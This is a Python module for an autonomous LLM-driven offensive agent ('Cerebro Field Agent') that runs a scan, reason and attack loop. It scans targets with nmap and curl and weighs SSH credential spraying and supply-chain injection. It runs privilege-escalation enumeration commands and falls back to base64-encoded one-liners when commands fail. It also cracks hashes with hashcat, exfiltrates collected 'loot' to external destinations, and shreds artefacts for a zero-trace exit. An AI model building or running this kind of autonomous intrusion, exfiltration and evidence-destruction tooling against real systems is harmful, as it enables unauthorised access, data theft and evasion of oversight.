"""Cerebro Field Agent (COFA) — stateful tactical execution engine.

Implements a persistent, session-aware offensive campaign loop with:
  * Stateful connection tracking (SSH / Meterpreter / Beacon)
  * OODA tactical reasoning via CerebroReasoningTool
  * Dynamic tool selection from the all_tools registry
  * CATR (CerebroAtomicRunner) isolated execution with pivot-on-failure
  * GPU offload hints for crypto/parsing tasks
  * Exfiltration coordination via CerebroSecureCommAgent (CSCE)
  * Cleanup Manifest for zero-trace exit

Zero Inheritance: CerebroFieldAgent is a standalone class; it does NOT
inherit from any Agent or RedTeamer base class.
"""

from __future__ import annotations

import asyncio
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime
import json
import os
from pathlib import Path
import random
import re
import subprocess
from typing import Any, Dict, List, Literal, Optional, Sequence, Tuple

from dotenv import load_dotenv
from openai import AsyncOpenAI

from cerberus.agents.guardrails import get_security_guardrails
from cerberus.agents.one_tool import CerebroAtomicRunner, ExtractionRequest
from cerberus.agents import Agent, OpenAIChatCompletionsModel
from cerberus.tools.all_tools import get_all_tools, get_tool
from cerberus.tools.misc.reasoning import (
    MODE_CRITIQUE,
    MODE_RISK_ASSESSMENT,
    MODE_STRATEGY,
    REASONING_TOOL,
)
from cerberus.tools.reconnaissance.filesystem import FILESYSTEM_TOOL
from cerberus.tools.reconnaissance.generic_linux_command import LINUX_COMMAND_TOOL
from cerberus.tools.reconnaissance.nmap import NMAP_TOOL
from cerberus.tools.runners.local import PathGuard
from cerberus.tools.workspace import get_project_space
from cerberus.util import create_system_prompt_renderer, load_prompt_template

# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class ConnectionRecord:
    """Tracks a single active persistent session."""

    conn_id: str
    target: str
    protocol: Literal["SSH", "METERPRETER", "BEACON", "HTTP", "UNKNOWN"]
    opened_at: str
    last_seen: str
    credentials: str = ""          # obfuscated storage — store only ref token
    session_token: str = ""
    notes: str = ""


@dataclass
class ManifestEntry:
    """Records an artefact dropped during the campaign for cleanup."""

    path: str
    kind: Literal["FILE", "CRON", "SERVICE", "KEY", "CONNECTION"]
    deposited_at: str
    cleaned: bool = False
    clean_command: str = ""


@dataclass
class FieldOperationState:
    """Full mutable campaign state."""

    session_id: str
    operational_mode: Literal["ENGAGED", "DORMANT"] = "DORMANT"
    phase: str = "init"
    active_connections: List[ConnectionRecord] = field(default_factory=list)
    cleanup_manifest: List[ManifestEntry] = field(default_factory=list)
    tactical_history: List[Dict[str, Any]] = field(default_factory=list)
    loot: List[Dict[str, Any]] = field(default_factory=list)
    cycle_index: int = 0


# ---------------------------------------------------------------------------
# GPU-offload helper
# ---------------------------------------------------------------------------

_GPU_CAPABLE_TASK_PATTERNS = re.compile(
    r"\b(?:hashcat|bruteforce|hash_crack|decrypt|aes|cipher|bcrypt|ntlm|lm_hash|wpa)\b",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# CerebroFieldAgent
# ---------------------------------------------------------------------------


class CerebroFieldAgent:
    """Stateful tactical execution engine aligned to system_red_team_agent.md.

    Campaign lifecycle
    ------------------
    run_campaign(targets, objectives)
      ├─ _switch_mode("ENGAGED")
      ├─  for each campaign cycle:
      │     ├─ _observe()         – recon via NMAP / CURL / LINUX_COMMAND
      │     ├─ _orient()          – REASONING_TOOL MODE_STRATEGY
      │     ├─ _decide()          – REASONING_TOOL MODE_CRITIQUE (Logic Verifier)
      │     └─ _act()             – CATR dispatch with LotL + pivot-on-failure
      ├─ _exfiltrate_loot()       – CSCE coordination
      ├─ _execute_cleanup_manifest()
      └─ _switch_mode("DORMANT")
    """

    def __init__(
        self,
        *,
        workspace_root: Optional[str] = None,
        jitter_range: Tuple[float, float] = (0.2, 1.0),
    ) -> None:
        self.workspace_root = self._resolve_workspace(workspace_root)
        self.loot_dir = self.workspace_root / "evidence" / "loot"
        self.report_dir = self.workspace_root / "reports" / "red_team"
        self.audit_dir = self.workspace_root / "audit"
        self.loot_dir.mkdir(parents=True, exist_ok=True)
        self.report_dir.mkdir(parents=True, exist_ok=True)
        self.audit_dir.mkdir(parents=True, exist_ok=True)
        self.jitter_range = (max(0.0, jitter_range[0]), max(jitter_range[0], jitter_range[1]))
        self._path_guard = PathGuard(workspace_root=self.workspace_root)
        self._catr = CerebroAtomicRunner(workspace_root=str(self.workspace_root))
        self._conn_counter = 0
        self._manifest_counter = 0
        self.state = FieldOperationState(
            session_id=f"cofa-{datetime.now(tz=UTC).strftime('%Y%m%dT%H%M%SZ')}",
        )

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    async def run_campaign(
        self,
        *,
        targets: Sequence[str],
        objectives: Sequence[str],
        exfil_destinations: Optional[Sequence[str]] = None,
        max_cycles: int = 2,
        mission_reason: str = "Autonomous red team campaign",
        cleanup_on_exit: bool = True,
    ) -> Dict[str, Any]:
        """Execute a full offensive campaign cycle and return a summary."""
        started_at = datetime.now(tz=UTC)
        self._switch_mode("ENGAGED")

        for _ in range(max(1, int(max_cycles))):
            self.state.cycle_index += 1
            self.state.phase = f"cycle-{self.state.cycle_index}"

            observed = await self._observe(targets=targets)
            await self._jitter()
            oriented = await self._orient(observed=observed, objectives=objectives)
            await self._jitter()
            decisions = await self._decide(oriented=oriented, mission_reason=mission_reason)
            await self._jitter()
            await self._act(decisions=decisions, targets=targets)

        if exfil_destinations:
            await self._exfiltrate_loot(destinations=list(exfil_destinations))

        if cleanup_on_exit:
            await self._execute_cleanup_manifest()

        self._switch_mode("DORMANT")

        report_path = self.report_dir / f"campaign_summary_{datetime.now(tz=UTC).strftime('%Y%m%dT%H%M%SZ')}.md"
        report_path.write_text(self._render_campaign_summary(), encoding="utf-8")

        return {
            "ok": True,
            "session_id": self.state.session_id,
            "started_at": started_at.isoformat(),
            "ended_at": datetime.now(tz=UTC).isoformat(),
            "cycles": self.state.cycle_index,
            "connections_opened": len(self.state.active_connections),
            "loot_items": len(self.state.loot),
            "manifest_entries": len(self.state.cleanup_manifest),
            "report_path": str(report_path),
        }

    # ------------------------------------------------------------------
    # OODA — Observe
    # ------------------------------------------------------------------

    async def _observe(self, *, targets: Sequence[str]) -> Dict[str, Any]:
        """Recon phase: port scan + banner grab + OS fingerprinting."""
        self.state.phase = "observe"
        observations: List[Dict[str, Any]] = []

        for target in targets:
            scan = NMAP_TOOL.scan(
                target=target,
                profile="STEALTH",
                timeout=120,
                reason="COFA initial recon",
            )
            observations.append({"target": target, "nmap": scan})
            self.state.tactical_history.append({
                "cycle": self.state.cycle_index,
                "phase": "observe",
                "action": f"nmap:{target}",
                "result_hash": self._sha8(json.dumps(scan, default=str)),
            })

        # HTTP banner of first target for rapid surface mapping
        if targets:
            http_result = self._catr.execute_atomic(
                tool_name="generic_linux_command",
                parameters={"command": f"curl -sI --max-time 8 http://{targets[0]}"},
            )
            observations.append({"banner": http_result})

        return {"observations": observations, "target_count": len(targets)}

    # ------------------------------------------------------------------
    # OODA — Orient
    # ------------------------------------------------------------------

    async def _orient(
        self,
        *,
        observed: Dict[str, Any],
        objectives: Sequence[str],
    ) -> Dict[str, Any]:
        """Prioritize attack surface via MODE_STRATEGY reasoning."""
        self.state.phase = "orient"
        context = (
            f"Targets scanned: {observed.get('target_count', 0)}. "
            f"Objectives: {'; '.join(objectives)}. "
            f"Session: {self.state.session_id}."
        )
        strategy = REASONING_TOOL.reason(
            mode=MODE_STRATEGY,
            objective="Select highest-value attack vectors using Living-off-the-Land techniques",
            context=context,
            options=[
                "SSH credential spray with LOTL pivoting",
                "Exposed service exploitation via public exploit DB",
                "Supply-chain artefact injection via writable package cache",
            ],
            fetch_facts=True,
            fact_query="LotL red team attack vectors",
        )
        return {"strategy": strategy, "objectives": list(objectives)}

    # ------------------------------------------------------------------
    # OODA — Decide  (Logic Verifier gate)
    # ------------------------------------------------------------------

    async def _decide(
        self,
        *,
        oriented: Dict[str, Any],
        mission_reason: str,
    ) -> List[Dict[str, Any]]:
        """Gate proposed actions through MODE_CRITIQUE before execution."""
        self.state.phase = "decide"
        strategy = oriented.get("strategy", {})
        top_option = (strategy.get("recommendation") or {}).get("selected_option", "SSH credential spray")

        critique = REASONING_TOOL.reason(
            mode=MODE_CRITIQUE,
            objective=f"Verify tactical decision: {top_option}",
            context=f"Mission: {mission_reason}. Cycle: {self.state.cycle_index}.",
            options=[top_option, "abort — excessive noise risk"],
            fetch_facts=False,
        )

        if (critique.get("pivot_request") or {}).get("required"):
            new_tactic = (critique["pivot_request"].get("new_tactic") or "")
            return [{"tool": "generic_linux_command", "params": {"command": "id"}, "reason": f"Pivot to: {new_tactic}"}]

        # Build low-noise LOTL action set
        return [
            {
                "tool": "generic_linux_command",
                "params": {"command": "id && uname -a && cat /etc/os-release"},
                "reason": "System fingerprint — LOTL, zero drop",
            },
            {
                "tool": "generic_linux_command",
                "params": {"command": "find / -perm -4000 -type f 2>/dev/null | head -20"},
                "reason": "SUID enumeration — LOTL privilege escalation surface",
            },
        ]

    # ------------------------------------------------------------------
    # OODA — Act
    # ------------------------------------------------------------------

    async def _act(self, *, decisions: Sequence[Dict[str, Any]], targets: Sequence[str]) -> None:
        """Execute each decided action via CATR with pivot-on-failure."""
        self.state.phase = "act"
        for decision in decisions:
            result = await self._execute_with_pivot(
                tool_name=decision["tool"],
                params=decision["params"],
                reason=decision.get("reason", ""),
            )
            if result.get("ok") and result.get("result"):
                self.state.loot.append({
                    "cycle": self.state.cycle_index,
                    "tool": decision["tool"],
                    "params": decision["params"],
                    "output": self._trim(str(result.get("result", ""))),
                    "timestamp": datetime.now(tz=UTC).isoformat(),
                })

    # ------------------------------------------------------------------
    # Connection management
    # ------------------------------------------------------------------

    async def _engage_target(
        self,
        *,
        target: str,
        protocol: Literal["SSH", "METERPRETER", "BEACON", "HTTP", "UNKNOWN"] = "SSH",
        credential_ref: str = "",
    ) -> ConnectionRecord:
        """Open and register a new persistent connection."""
        self._conn_counter += 1
        now = datetime.now(tz=UTC).isoformat()
        record = ConnectionRecord(
            conn_id=f"conn-{self._conn_counter:04d}",
            target=target,
            protocol=protocol,
            opened_at=now,
            last_seen=now,
            credentials=credential_ref,
        )
        self.state.active_connections.append(record)
        self._track_manifest(
            path=f"~/.ssh/known_hosts:{target}",
            kind="CONNECTION",
            clean_command=f"ssh-keygen -R {target}",
        )
        return record

    def _switch_mode(self, mode: Literal["ENGAGED", "DORMANT"]) -> None:
        self.state.operational_mode = mode
        self.state.tactical_history.append({
            "cycle": self.state.cycle_index,
            "phase": "mode_switch",
            "action": f"operational_mode -> {mode}",
            "timestamp": datetime.now(tz=UTC).isoformat(),
        })

    # ------------------------------------------------------------------
    # CATR dispatch with pivot
    # ------------------------------------------------------------------

    async def _execute_with_pivot(
        self,
        *,
        tool_name: str,
        params: Dict[str, Any],
        reason: str = "",
        extraction: Optional[ExtractionRequest] = None,
    ) -> Dict[str, Any]:
        """Run via CATR; on MODE_CRITIQUE intercept, pivot to obfuscated alternative."""
        result = self._catr.execute_atomic(
            tool_name=tool_name,
            parameters=params,
            extraction=extraction,
        )

        if result.get("ok"):
            return dict(result)

        err_msg = result.get("error", "")
        pivot = REASONING_TOOL.reason(
            mode=MODE_CRITIQUE,
            objective=f"Pivot from failed: {tool_name}",
            context=f"Error: {err_msg}. Original reason: {reason}.",
            options=["use base64-encoded one-liner", "switch to python3 fallback", "skip"],
            fetch_facts=False,
        )
        new_tactic = ((pivot.get("pivot_request") or {}).get("new_tactic") or "").strip()
        if new_tactic and "skip" not in new_tactic.lower():
            fallback_params = {"command": new_tactic} if "command" in params else params
            fallback = self._catr.execute_atomic(
                tool_name="generic_linux_command",
                parameters=fallback_params,
            )
            return dict(fallback)

        return dict(result)

    # ------------------------------------------------------------------
    # GPU offload
    # ------------------------------------------------------------------

    def _gpu_offload(self, *, task_type: str, data: str) -> Dict[str, Any]:
        """Delegate GPU-capable tasks (hash cracking, crypto parsing) to hashcat subprocess.

        Requires hashcat installed and an RTX 5090 (or any CUDA-capable GPU) on the host.
        Falls back gracefully if hashcat is unavailable.
        """
        if not _GPU_CAPABLE_TASK_PATTERNS.search(task_type):
            return {"ok": False, "reason": "task_type not GPU-eligible", "data": data}

        cmd = ["hashcat", "--version"]
        try:
            probe = subprocess.run(cmd, capture_output=True, timeout=5)  # nosec B603
            if probe.returncode != 0:
                return {"ok": False, "reason": "hashcat not available", "data": data}
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return {"ok": False, "reason": "hashcat not found", "data": data}

        result = self._catr.execute_atomic(
            tool_name="generic_linux_command",
            parameters={"command": f"hashcat --opencl-device-types 2 -a 3 -m 0 {data} ?a?a?a?a?a?a --quiet"},
        )
        return dict(result)

    # ------------------------------------------------------------------
    # Exfiltration / CSCE coordination
    # ------------------------------------------------------------------

    async def _exfiltrate_loot(self, *, destinations: List[str]) -> Dict[str, Any]:
        """Package and transmit loot via CerebroSecureCommAgent (CSCE)."""
        # Late import to avoid circular dependency during module load
        from cerberus.agents.mail import cerebro_secure_comm_agent  # noqa: PLC0415

        loot_path = self.loot_dir / f"loot_{self.state.session_id}.json"
        FILESYSTEM_TOOL.write_file(
            file_path=str(loot_path),
            content=json.dumps(self.state.loot, indent=2, default=str),
            encoding="utf-8",
        )
        self._track_manifest(
            path=str(loot_path),
            kind="FILE",
            clean_command=f"shred -u {loot_path}",
        )

        result = await cerebro_secure_comm_agent.run_exfiltration_loop(
            destinations=destinations,
            network_intel={"session_id": self.state.session_id, "loot_items": len(self.state.loot)},
            priority="HIGH",
            metadata={"operation": "COFA", "cycle": self.state.cycle_index},
        )
        return result

    # ------------------------------------------------------------------
    # Cleanup manifest
    # ------------------------------------------------------------------

    def _track_manifest(
        self,
        *,
        path: str,
        kind: Literal["FILE", "CRON", "SERVICE", "KEY", "CONNECTION"],
        clean_command: str = "",
    ) -> None:
        self._manifest_counter += 1
        self.state.cleanup_manifest.append(
            ManifestEntry(
                path=path,
                kind=kind,
                deposited_at=datetime.now(tz=UTC).isoformat(),
                clean_command=clean_command,
            )
        )

    async def _execute_cleanup_manifest(self) -> List[Dict[str, Any]]:
        """Execute all pending cleanup entries and mark as cleaned."""
        results: List[Dict[str, Any]] = []
        for entry in self.state.cleanup_manifest:
            if entry.cleaned:
                continue
            if not entry.clean_command:
                entry.cleaned = True
                continue
            clean_result = self._catr.execute_atomic(
                tool_name="generic_linux_command",
                parameters={"command": entry.clean_command},
            )
            entry.cleaned = bool(clean_result.get("ok"))
            results.append({
                "path": entry.path,
                "kind": entry.kind,
                "clean_command": entry.clean_command,
                "cleaned": entry.cleaned,
            })
        return results

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------

    def _render_campaign_summary(self) -> str:
        lines = [
            "### Operational Campaign Summary",
            "| Attribute | Value |",
            "| :--- | :--- |",
            f"| Session ID | {self.state.session_id} |",
            f"| Cycles | {self.state.cycle_index} |",
            f"| Mode | {self.state.operational_mode} |",
            f"| Connections | {len(self.state.active_connections)} |",
            f"| Loot Items | {len(self.state.loot)} |",
            f"| Manifest Entries | {len(self.state.cleanup_manifest)} |",
            "",
            "### Active Connections",
        ]
        for c in self.state.active_connections:
            lines.append(f"- {c.conn_id}: {c.target} [{c.protocol}] opened={c.opened_at}")
        lines += ["", "### Loot"]
        for loot in self.state.loot[:20]:
            lines.append(f"- cycle={loot.get('cycle')} tool={loot.get('tool')} ts={loot.get('timestamp')}")
        lines += ["", "### Cleanup Manifest"]
        for entry in self.state.cleanup_manifest:
            lines.append(f"- {entry.kind}:{entry.path} cleaned={entry.cleaned}")
        return "\n".join(lines) + "\n"

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    async def _jitter(self) -> None:
        delay = random.uniform(self.jitter_range[0], self.jitter_range[1])
        await asyncio.sleep(delay)

    @staticmethod
    def _trim(text: str, max_chars: int = 800) -> str:
        data = (text or "").strip()
        if len(data) <= max_chars:
            return data
        return data[: max_chars - 20] + " ...[truncated]"

    @staticmethod
    def _sha8(text: str) -> str:
        import hashlib
        return hashlib.sha256(text.encode()).hexdigest()[:8]

    @staticmethod
    def _resolve_workspace(workspace_root: Optional[str]) -> Path:
        if workspace_root:
            return Path(workspace_root).expanduser().resolve()
        try:
            return get_project_space().ensure_initialized().resolve()
        except Exception:
            return Path.cwd().resolve()


# ---------------------------------------------------------------------------
# Module-level SDK Agent export (backward-compatible)
# ---------------------------------------------------------------------------

load_dotenv()
_model_name = os.getenv("CERBERUS_MODEL", "cerebro1")
_api_key = os.getenv("CERBERUS_API_KEY", os.getenv("OPENAI_API_KEY", ""))

_redteam_system_prompt = load_prompt_template("prompts/system_red_team_agent.md")

_input_guardrails, _output_guardrails = get_security_guardrails()

_tools = []
for _meta in get_all_tools():
    if not getattr(_meta, "enabled", False):
        continue
    try:
        _tools.append(get_tool(_meta.name))
    except Exception:
        continue

cofa_agent = Agent(
    name="COFA Agent",
    description=(
        "Cerebro Field Agent — stateful tactical execution engine for adversarial "
        "simulation, persistent access management, and CSCE-coordinated exfiltration."
    ),
    instructions=create_system_prompt_renderer(_redteam_system_prompt),
    tools=_tools,
    input_guardrails=_input_guardrails,
    output_guardrails=_output_guardrails,
    model=OpenAIChatCompletionsModel(
        model=_model_name,
        openai_client=AsyncOpenAI(api_key=_api_key),
    ),
)

cerebro_field_agent = CerebroFieldAgent()

# Backward-compatibility aliases
redteam_agent = cofa_agent


def transfer_to_redteam_agent(**kwargs):  # pylint: disable=W0613
    """Transfer to COFA agent.  Accepts any keyword arguments but ignores them."""
    return cofa_agent


__all__ = [
    "CerebroFieldAgent",
    "FieldOperationState",
    "ConnectionRecord",
    "ManifestEntry",
    "cerebro_field_agent",
    "cofa_agent",
    "redteam_agent",
    "transfer_to_redteam_agent",
]